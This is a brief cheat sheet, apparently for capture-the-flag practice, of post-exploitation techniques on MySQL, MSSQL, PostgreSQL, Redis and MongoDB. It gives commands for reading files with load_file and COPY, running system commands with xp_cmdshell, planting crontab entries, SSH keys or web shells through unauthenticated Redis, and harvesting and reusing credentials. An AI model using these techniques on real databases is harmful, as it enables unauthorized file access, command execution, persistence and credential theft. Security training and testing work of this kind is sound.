title: Database Post-Exploitation Quick Reference
description: Obtain data, gain shell access, or read files across common databases
detail:
MySQL: SELECT load_file('/flag'); SHOW VARIABLES LIKE 'secure%'; writing a shell requires permissions and a writable path
MSSQL: EXEC xp_cmdshell 'whoami' (enable with sp_configure and restart/use as configured)
PostgreSQL: COPY t FROM '/flag'; lo_import to read files via large objects
Redis unauthenticated: write crontab/SSH key/web shell (use CONFIG GET dir to find paths); master-slave replication RCE
MongoDB: query databases directly when unauthenticated
For all databases: check system databases for user tables first → credentials → reuse.
